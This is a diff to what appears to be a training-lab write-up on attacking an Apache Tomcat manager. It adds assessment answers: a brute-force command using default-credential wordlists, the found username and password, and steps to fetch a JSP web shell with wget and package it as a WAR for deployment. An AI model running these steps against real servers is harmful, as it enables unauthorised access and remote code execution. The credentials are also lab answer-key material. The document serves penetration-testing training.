@@ -151,13 +151,26 @@ In some Tomcat installs, we may be able to access sensitive data within the WEB-
 
 ## Assessment
 
-Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?
+**Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?**
 
+```
+python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+```
 
+* tomcat
 
-What is the password?
+**What is the password?**
 
+* root
 
+**Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat\_flag.txt**
 
-Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat\_flag.txt
+```
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp 
+```
+
+browse > deploy
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>/backup</p></figcaption></figure>
 
